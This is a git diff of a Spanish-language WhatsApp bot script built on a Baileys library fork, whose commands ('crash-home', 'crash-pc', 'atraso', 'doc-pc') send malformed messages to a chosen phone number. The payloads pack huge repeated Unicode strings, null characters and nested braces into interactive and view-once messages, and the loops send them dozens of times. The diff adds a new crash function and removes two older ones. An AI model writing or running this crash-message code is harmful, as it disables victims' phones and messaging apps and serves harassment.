@@ -1,5 +1,5 @@
 require("./config")
-const { normalizeMessageContent,generateMessageIDV2, generateMessageID, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
+const { normalizeMessageContent,generateMessageIDV2, generateMessageID, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("baron-baileys-v2")
 const FormData = require('form-data')
 const fs = require('fs')
 const moment = require('moment-timezone');
@@ -112,10 +112,11 @@ const iphost = await fetchJson(`https://api.ipify.org/?format=json`)
 const web = fs.readFileSync('./src/opa.webp');
 const chatId = m.chat;
 const uwu = 'ꦿꦶꦷꦸꦹꦽ'.repeat(500);
-const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(1050);
+const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(600);
 const axios = require('axios');
 const delay = ms => new Promise(res => setTimeout(res, ms));
-
+const crypto = require('crypto');
+messageSecret: crypto.randomBytes(32)
 
 //++++++++Funcion 1++++++++++\\
 async function LocaBugs(target) {
@@ -131,7 +132,7 @@ async function LocaBugs(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: `☠️ • 𝐂𝐫𝐚𝐬𝐡 𝐔𝐢? 𝐤𝐤𝐤𝐤𝐣𝐤`+'ꦿꦶꦷꦸꦹꦽ'.repeat(100000)
+                        text: `☠️ • 𝐂𝐫𝐚𝐬𝐡 𝐔𝐢? 𝐤𝐤𝐤𝐤𝐣𝐜`+'ꦿꦶꦷꦸꦹꦽ'.repeat(100000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -141,7 +142,7 @@ async function LocaBugs(target) {
                 }
             }
         }
-    }, { participant: { jid: target } }, { messageId: null });
+    }, { participant: { jid: target } });
 }
 //++++++++++++Funcion 2+++++++++++++\\
 async function ZeroRadiactive(target) {
@@ -269,13 +270,7 @@ async function ZeroRadiactive(target) {
                     }
                 }
             }
-        }, {
-            additionalNodes: [{
-                tag: "meta",
-                attrs: { is_status_mention: "true" },
-                content: undefined
-            }]
-        });
+        }, { participant: { jid: target } });
     }
 }
 //++++++++++++Funcion 3+++++++++++++\\
@@ -335,7 +330,7 @@ await conn.relayMessage(target, {
                 'stanzaId': target,
                 'participant': target,
                 'quotedMessage': {
-                    'conversation': '🍏 • 𝐍𝐨 𝐭𝐫𝐚𝐯𝐚 𝐢𝐏𝐡𝐨𝐧𝐞 𝟏𝟓? 𝐤𝐤𝐤𝐤𝐣𝐤' + 'ꦾ'.repeat(50000)
+                    'conversation': '🍏 • 𝐍𝐨 𝐭𝐫𝐚𝐯𝐚 𝐢𝐏𝐡𝐨𝐧𝐞 𝟏𝟓? 𝐤𝐤𝐤𝐤𝐣𝐜' + 'ꦾ'.repeat(50000)
                 },
                 'disappearingMode': {
                     'initiator': "CHANGED_IN_CHAT",
@@ -539,81 +534,141 @@ async function stikerNotif(target) {
     console.log(err);
   }
 }
-switch(command) {
-case 'crashwa': {
-  if (!q) return enviar(`Ejemplo:\n${prefix + command} 521234567890`);
-  const target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+async function invisSqL(isTarget) {
+  const Node = [
+    {
+      tag: "bot",
+      attrs: {
+        biz_bot: "1"
+      }
+    }
+  ];
 
-  const payload = {
+  const msg = generateWAMessageFromContent(isTarget, {
     viewOnceMessage: {
       message: {
-        interactiveMessage: {
-          contextInfo: {
-            mentionedJid: [target],
-            forwardingScore: 999,
-            isForwarded: true
-          },
-          body: { text: 'wa.me/settings' },
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: 'cta_url',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings',
-                  url: `wa.me/settings`
-                })
-              },
-              {
-                name: 'cta_call',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings' +  "\u0000".repeat(7000),
-                })
-              },
-              {
-                name: 'cta_call',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings' +  "\u0000".repeat(7000),
-                })
-              },
-              {
-                name: 'cta_call',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings' +  "\u0000".repeat(7000),
-                })
-              },
-              {
-                name: 'cta_call',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings' +  "\u0000".repeat(7000),
-                })
-              },
-              {
-                name: 'cta_call',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings' + sekzo3,
-                })
-              },
-              {
-                name: 'cta_call',
-                buttonParamsJson: JSON.stringify({
-                  display_text: 'wa.me/settings' + sekzo3,
-                })
-              },
-            ]
-          }
-        },
         messageContextInfo: {
           deviceListMetadata: {},
-          deviceListMetadataVersion: 2
+          deviceListMetadataVersion: 2,
+          messageSecret: crypto.randomBytes(32),
+          supportPayload: JSON.stringify({
+            version: 2,
+            is_ai_message: true,
+            should_show_system_message: true,
+            ticket_id: crypto.randomBytes(16)
+          })
+        },
+        interactiveMessage: {
+          header: {
+            title: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 ",
+            hasMediaAttachment: false,
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
+              mimetype: "image/jpeg",
+              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
+              fileLength: "11887",
+              height: 1080,
+              width: 1080,
+              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
+              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
+              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1750124469",
+              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
+              contextInfo: {
+                mentionedJid: [isTarget],
+                participant: isTarget,
+                remoteJid: isTarget,
+                expiration: 9741,
+                ephemeralSettingTimestamp: 9741,
+                entryPointConversionSource: "WhatsApp.com",
+                entryPointConversionApp: "WhatsApp",
+                entryPointConversionDelaySeconds: 9742,
+                disappearingMode: {
+                  initiator: "INITIATED_BY_OTHER",
+                  trigger: "ACCOUNT_SETTING"
+                }
+              },
+              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
+              scanLengths: [2071, 6199, 1634, 1983],
+              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
+            }
+          },
+          body: {
+            text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘"
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "{".repeat(10000)
+          }
         }
       }
     }
-  };
+  }, {});
 
-  await conn.relayMessage(target, payload, {});
-  enviar('✅ Crash WA/Call enviado.');
-  break;
+  await conn.relayMessage(isTarget, msg.message, {
+    participant: { jid: isTarget },
+    additionalNodes: Node,
+    messageId: msg.key.id
+  });
 }
+
+switch(command) {
+case "crash-home":{
+if (!isBot && !isCreator) return 
+let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
+let target = pelaku + "@s.whatsapp.net"
+let doneios = `
+   🎠𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘
+⿻ Tarjeta : @${target.split('@')[0]}
+⿻ Tipo : Crash Home Android Invisible 📱
+⿻ Estado : Exitoso ✅️
+`
+   try {
+    conn.sendMessage(from, {
+        image: { url: './src/catalogo.jpg' },
+        caption: doneios,
+        footer: "</> Porfavor espera 10 minutos para evitar la suspensión",
+        buttons: [
+            {
+                buttonId: "#", 
+                buttonText: { displayText: '-#' },
+                type: 1
+            }
+        ],
+        contextInfo: {
+        externalAdReply: {
+            title: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘𝐛",
+            body: "Crash Invisible Android", 
+            thumbnail: fs.readFileSync ('./src/opa.webp'),
+            sourceUrl: "https://youtube.com/@p.a.zinwebkkkkj",
+            mediaType: 1,
+            renderLargerThumbnail: false
+        }
+    },
+        headerType: 4,
+        viewOnce: true
+    }, { quoted: m })
+
+for (let r = 0; r < 10; r++) {
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+await invisSqL(target)
+        }
+    } catch (error) {
+        console.error("Error en", error);
+        reply("Error", error);
+    }
+    }
+break
+
 case 'crash': {
   if (!q) return enviar(`Ejemplo:\n${prefix + command} 521234567890`);
   const target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
@@ -684,7 +739,7 @@ conn.sendMessage(from, {audio: fs.readFileSync('./src/audio.mp3'), mimetype:'aud
 break
 
 case 'pin':
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
+if (!isBot && !isCreator) return 
     if (!q) return enviar(`\`Proporciona el texto de búsqueda.\`\n*Ejemplo:* *${prefix + command} Goku*`);
     try {
         await conn.sendMessage(from, { react: { text: '🎗️', key: m.key } });
@@ -724,7 +779,7 @@ if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR 
     break;
    
 case 'atraso': {
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
+if (!isBot && !isCreator) return 
 if (!q) return reply(`ejemplo: ${prefix + command} 52×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 for (let i = 0; i < 50; i++) {
@@ -776,95 +831,7 @@ if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR 
   }
 }
 break;
-case 'crashzeta': {
-  if (!isBot) return
-  const nnn = '\u0003'.repeat(5000)
-  const tmsg = await generateWAMessageFromContent('status@broadcast', {
-    buttonsMessage: {
-      contentText: '° bruxo mentioned you',
-      footerText: 'by Zack 🦠' + null ,
-      buttons: [
-        {
-          buttonId: 'Opaopa',
-          buttonText: { displayText: '@' },
-          type: 1
-        }
-      ],
-      headerType: 1
-    }
-  }, { userJid: m.chat });
 
-  await conn.relayMessage('status@broadcast', tmsg.message, {
-    messageId: tmsg.key.id,
-    statusJidList: [m.chat],
-    additionalNodes: [{
-      tag: 'meta',
-      attrs: {},
-      content: [{
-        tag: 'mentioned_users',
-        attrs: {},
-        content: [{ tag: 'to', attrs: { jid: m.chat } }]
-      }]
-    }]
-  });
-  const crashView = await generateWAMessageFromContent(m.chat, {
-    viewOnceMessage: {
-      message: {
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 4
-        },
-        interactiveMessage: {
-          body: {
-            text: `kkkkk \n${nnn} \nola ola sekozuwu`
-          },
-          nativeFlowMessage: {
-            messageVersion: 3.3,
-            buttons: [
-              { name: 'single_select', buttonParamsJson: '\u0003'.repeat(500) },
-              {
-  name: 'call_permission_request',
-  buttonParamsJson: JSON.stringify({
-    crash: true,
-    z: '𑐶𑐵𑆷𑐷𑆵'.repeat(9999)
-  }) + '\u0003'
-},
-              { name: 'mpm', buttonParamsJson: '' },
-              { name: 'mpm'+ '𑐶𑐵𑆷𑐷𑆵'.repeat(200), buttonParamsJson: '' },
-              { name: 'mpm', buttonParamsJson: '' },
-              { name: 'mpm', buttonParamsJson: '' }
-            ],
-            messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🎗","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
-          }
-        }
-      }
-    }
-  }, { userJid: m.chat });
-  const fakeQuoted = {
-    key: {
-      fromMe: false,
-      stanzaId: tmsg.key.id,
-      participant: '0@s.whatsapp.net',
-      remoteJid: 'status@broadcast'
-    },
-    message: {
-      extendedTextMessage: {
-        text: '*KKKKKK*' 
-      }
-    }
-  };
-
-  await sleep(1000);
-  await conn.sendMessage(m.chat, { text: 'zapzap' }, { quoted: fakeQuoted });
-  for (let i = 0; i < 5; i++) {
-    await conn.relayMessage(m.chat, crashView.message, {
-      messageId: crashView.key.id
-    });
-    await sleep(800);
-  }
-
-  break;
-}
 case 'copiar': {
   if (!m.message) return enviar('No hay mensaje.');
   console.log(JSON.stringify(m.message, null, 2));
@@ -872,7 +839,7 @@ case 'copiar': {
   break;
 
 case 'menu':
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO APENAS MI CREADOR PUEDE USAR*\n`)
+if (!isBot && !isCreator) return
 const os = require('os')
 var deviceType = m.key.id.length > 21 ? 'Android' : m.mkey.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
 const time = hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
@@ -881,7 +848,7 @@ await conn.sendMessage(from, {
 image: {url: './src/foto.jpg'},
 "contextInfo": {
 "externalAdReply": {
-"title": `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
+"title": `by 𝐌𝐚𝐢𝐤𝐞𝐥`,
 "body": '☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️',
 "mediaType": 4,
 "thumbnail": web,
@@ -893,19 +860,17 @@ image: {url: './src/foto.jpg'},
 caption: `
 ╭⪫═════════════════⪫
 │ ☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️
-│ ✅ *𝖴𝗌𝗎𝖺𝗋𝗂𝗈:* ${pushname}
+│ ✅ *𝖴𝗌𝗎𝖺𝗿𝗂𝗈:* ${pushname}
 │ ✅ *𝖧𝗈𝗋𝖺:* ${hora}
 │ ✅ *𝖣𝖺𝗍𝖺:* ${data}
 │ ✅ *Estado:* online
-│ ✅ *𝖣𝗂𝗌𝗉𝗈𝗌𝗂𝗍𝗂𝗏𝗈:* ${deviceType}
+│ ✅ *𝖣𝗂𝗌𝗉𝗈𝗌𝗂𝗏𝗈:* ${deviceType}
 │ ✅ *𝖯𝗅𝖺𝗍𝖺𝖿𝗈𝗋𝗆𝖺:* ${os.platform()}
 │ ✅ *𝖧𝗈𝗌𝗍𝖭𝖺𝗆𝖾:* ${os.hostname()}
 ╰═════════════════╯`,
-footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
+footer: `𝐛y 𝐌𝐚𝐢𝐤𝐞𝐥`,
 buttons: [
-{buttonId: 'menu_android',buttonText: {displayText: "𝗠𝗘𝗡𝗨 𝗔𝗡𝗗𝗥𝗢𝗜𝗗"},type: 10},
-{buttonId: 'menu_ios',buttonText: {displayText: "𝗠𝗘𝗡𝗨 𝗜𝗣𝗛𝗢𝗡𝗘"},type: 10},
-{buttonId: 'menu_pc',buttonText: {displayText: "𝗠𝗘𝗡𝗨 𝗣𝗖"},type: 10},
+
 {buttonId: '..',
 buttonText: {displayText: '.'},
 type: 4,
@@ -915,12 +880,12 @@ paramsJson: JSON.stringify({
 title: "☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️",
 sections: [
 {
-title: "MENU 2",
+title: "MENU All",
 rows: [
 {
-title: " 《 • MENU 2 • 》",
+title: " 《 • 》",
 description: "☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️",
-id: `outros_menu`
+id: `menu_android`,
 },
 ]}]})
 }
@@ -931,7 +896,7 @@ viewOnce: true
 })
 break
 case 'button':
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
+if (!isBot && !isCreator) return
 await conn.sendMessage(from, {
 image: { url: './src/foto.jpg' },
 "contextInfo": {
@@ -950,17 +915,15 @@ footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
 buttons: [
   { buttonId: 'sekzo', buttonText: { displayText: sekzo3 }, type: 10 },
   { buttonId: 'sekzo2', buttonText: { displayText: sekzo3}, type: 10 },
-  { buttonId: 'sekzo34', buttonText: { displayText: sekzo3 }, type: 10 },
   { buttonId: 'sekzo4', buttonText: { displayText: sekzo3 }, type: 10 },
   { buttonId: 'sekzo7', buttonText: { displayText: sekzo3 }, type: 10 },
-  { buttonId: 'sekzo2', buttonText: { displayText: sekzo3 }, type: 10 },
 ],
 headerType: 1,
 viewOnce: true
 });
 break;
-case 'menu_pc': { 
-if (!isBot) return enviar('Este comando es solo para el dueño del bot.');
+case 'menu_android': { 
+if (!isBot) return
 const aña = {
   key: {
     fromMe: false,
@@ -970,25 +933,30 @@ const aña = {
   },
   message: {
     extendedTextMessage: {
-      text: '𝐌𝐄𝐍𝐔 𝐏𝐂\n𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥'
+      text: 'by 𝐌𝐚𝐢𝐤𝐞𝐥'
     }
   }
 }
 await conn.sendMessage(from, { text: `
 ╭─────────────⪩ 
-│  \`𝐌𝐄𝐍𝐔 𝐏𝐂\`
-│ \`𝑪𝒓𝒂𝒔𝒉 𝑷𝑪\`
-│  
-├ ${prefix}catalogo-pc
-├ ${prefix}loc-pc
-├ ${prefix}
+│ \`𝑪𝒓𝒂𝒔𝒉\`
+│  𝒜𝓃𝒹𝓇𝑜𝒾𝒹
+├ ${prefix}crash-home 
+├ ${prefix}button 
+├ ${prefix}atraso
+├    𝐼𝑜𝓈
+├ ${prefix}crash-ios
+├ ${prefix}atraso
+├   𝒢𝓇𝓊𝓅𝑜𝓈
+├ ${prefix}canal-adm
 │
 ╰─────────────⪨`}, 
 { quoted: aña }); 
 }
 break; 
+
 case 'doc-pc':
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO APENAS MI CREADOR PUEDE USAR*\n`)
+if (!isBot && !isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : body.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
           jumlah = "900"
           const repetir = 'ྃ'.repeat(77000)
@@ -999,7 +967,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : body.r
           }, { participant: { jid: Pe }})
           break
 case "loc-pc":
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)                
+if (!isBot && !isCreator) return
 for (let i = 0; i < 15; i++) {
 const puto = 'ྃ'.repeat(8765)
 conn.sendMessage(from,{
@@ -1009,18 +977,9 @@ conn.sendMessage(from,{
    name: "👾" + puto + puto }})
 }
 break
-case 'chat_infinite':
-await conn.relayMessage(from,{
-extendedTextMessage:{
-text: '@Larissa on telegram, crashed you',
-contextInfo:{
-mentionedJid: ["5521992999999@s.whatsapp.net"]
-}
-}
-},{})
-break
+
 case 'crash-pc':
-if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
+if (!isBot && !isCreator) return
 for (let i = 0; i < 50; i++) {
 conn.relayMessage(from, {
 viewOnceMessage: {
